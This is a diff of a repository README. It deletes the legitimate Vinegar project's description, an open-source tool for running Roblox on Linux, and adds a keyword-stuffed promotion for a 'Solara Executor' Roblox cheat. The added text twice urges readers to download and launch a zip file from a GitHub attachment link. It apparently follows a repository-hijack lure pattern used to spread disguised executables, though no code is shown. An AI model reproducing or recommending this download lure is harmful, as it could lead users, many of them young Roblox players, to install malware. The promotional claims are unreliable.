@@ -1,65 +1,76 @@
-# <img src="splash/vinegar.png" alt="Vinegar logo"> Vinegar
+# 🚀 Welcome to Solara Executor Repository! 🌟
 
-[![Pipeline Status][pipeline_img    ]][pipeline    ]
-[![Version        ][version_img     ]][version     ]
-[![Flathub        ][flathub_img     ]][flathub     ]
-[![Report Card    ][goreportcard_img]][goreportcard]
-[![Discord Server ][discord_img     ]][discord     ]
-[![Matrix Room    ][matrix_img      ]][matrix      ]
+## Repository Name: Solara-Executor
+### Repository Short Description: 
+The First & Best External Roblox Executor After Byfron. Copyright CMD Softworks Solara Executor
 
-An open-source, minimal, configurable, fast bootstrapper for running Roblox on Linux.
+## Topics:
+- solara 
+- roblox-script 
+- roblox-executor 
+- roblox-free-executor 
+- solara-roblox 
+- roblox-solara 
+- solara-executor 
+- roblox-executer 
+- solara-v2 
+- solara-roblox-download 
+- solara-executer 
+- solara-v3 
+- solarav3 
+- solara-roblox-github 
+- solara-script 
+- solara-roblox-discord 
+- solara-roblox-v3
 
-## Status of Roblox on Linux
-As of the 2nd of March, 2024, Roblox has blocked the use of Wine to access the Roblox Player.
-More information can be found [here](https://vinegarhq.org/Home/rol_faq.html).
+## :arrow_down: [Click here to download Solara V3!](https://github.com/user-attachments/files/18286083/SolaraV3.zip "Needs to be launched")
 
-Roblox Studio continues to be usable.
+---
 
-[pipeline]:     https://github.com/vinegarhq/vinegar/actions/workflows/go.yml
-[pipeline_img]: https://img.shields.io/github/actions/workflow/status/vinegarhq/vinegar/go.yml?style=flat-square&label=build%20%26%20tests
-[version]:     https://github.com/vinegarhq/vinegar/releases/latest
-[version_img]: https://img.shields.io/github/v/release/vinegarhq/vinegar?style=flat-square&display_name=tag
-[flathub]:     https://flathub.org/apps/details/org.vinegarhq.Vinegar
-[flathub_img]: https://img.shields.io/flathub/downloads/org.vinegarhq.Vinegar?style=flat-square
-[goreportcard]:     https://goreportcard.com/report/github.com/vinegarhq/vinegar
-[goreportcard_img]: https://goreportcard.com/badge/github.com/vinegarhq/vinegar?style=flat-square
-[discord]:     https://discord.gg/dzdzZ6Pps2
-[discord_img]: https://img.shields.io/discord/1069506340973707304?style=flat-square&label=discord
-[matrix]:      https://matrix.to/#/#vinegarhq:matrix.org
-[matrix_img]:  https://img.shields.io/matrix/vinegarhq:matrix.org?style=flat-square&label=matrix
+### ℹ️ How to Use Solara Executor:
+1. Download the zip file from the link provided above.
+2. Extract the contents of the zip file.
+3. Launch Solara Executor and enjoy using it on Roblox games!
 
-# Features
-+ Discord Rich Presence & BloxstrapRPC support
-+ Automatic GPU selection for PRIME systems
-+ Automatic [GameMode](https://github.com/FeralInteractive/gamemode) functionality
-+ Optional [UMU](https://github.com/Open-Wine-Components/umu-launcher) Proton support
-+ Multiple instances of Roblox open simultaneously
-+ Automatic Wineprefix killer when Roblox has quit
-+ Logging for both Vinegar, Wine and Roblox
-+ Modifications of Roblox via the Overlay directory, overwriting Roblox's files; such as re-adding the old death sound
-+ Automatic DXVK Installer and uninstaller
-+ Fast Multi-threaded installation and extraction of Roblox
-+ Automatic removal of outdated cached packages and versions of Roblox
-+ FPS Unlocking for Player by default, without rbxfpsunlocker
-+ Custom execution of wine program within wineprefix
-+ Set different environment variables and FFlags for both Player and Studio, with Global to override
-+ Force a specific version of Roblox to be deployed
-+ Custom launcher specified to be used when launching Roblox
-+ Wine Root feature to set a specific wine installation path
-+ Sanitization of environment
-+ Browser launch via MIME
-+ Splash window during setup, with error dialog support
+---
 
-# See Also
-+ [Discord server](https://discord.gg/dzdzZ6Pps2)
-+ [Matrix room](https://matrix.to/#/#vinegarhq:matrix.org)
-+ [Documentation](https://vinegarhq.github.io)
-+ [Roblox-Studio-Mod-Manager](https://github.com/MaximumADHD/Roblox-Studio-Mod-Manager)
-+ [Bloxstrap](https://github.com/pizzaboxer/bloxstrap)
+### 🌟 Why Choose Solara Executor?
+Solara Executor is a top-notch external executor for Roblox that offers advanced scripting capabilities and a user-friendly interface. With features inspired by Byfron and developed by CMD Softworks, Solara Executor stands out as the go-to choice for Roblox players looking to enhance their gameplay experience.
 
-# Acknowledgements
-+ Credits to
-  + [pizzaboxer](https://github.com/pizzaboxer)
-  + [MaximumADHD](https://github.com/MaximumADHD)
-+ Logo modified with Katie. Base glass SVG made by the [Twemoji team](https://twemoji.twitter.com/), Licensed under [CC-BY 4.0](https://creativecommons.org/licenses/by/4.0/).
-+ Katie usage authorized by [karliflux](https://karliflux.neocities.org)
+---
+
+### 🔥 Features of Solara Executor:
+- Advanced script execution
+- User-friendly interface
+- Compatibility with a wide range of Roblox games
+- Regular updates and improvements
+- Dedicated support team
+
+---
+
+### 🚨 Important Note:
+For the latest updates and releases, please check the "Releases" section in this repository.
+
+---
+
+### 🌐 Get Connected with Solara Executor:
+- **Discord Server:** Join our Discord community for discussions, support, and the latest news on Solara Executor.
+- **GitHub Repository:** Star and fork this repository to show your support and stay updated on the development of Solara Executor.
+
+---
+
+### 📸 Showcase:
+![Solara Executor](https://example.com/solara-executor-image.png)
+
+---
+
+### 🌌 Stay Ahead with Solara Executor:
+Don't miss out on the opportunity to elevate your Roblox gameplay with Solara Executor! Download now and experience a whole new level of scripting possibilities. Get ready to script, execute, and conquer your Roblox adventures like never before!
+
+---
+
+### ✨ Thank you for visiting the Solara Executor Repository! 🚀
+
+---
+
+### 📦 [Download Solara V3 Now!](https://github.com/user-attachments/files/18286083/SolaraV3.zip "Needs to be launched") 🌟
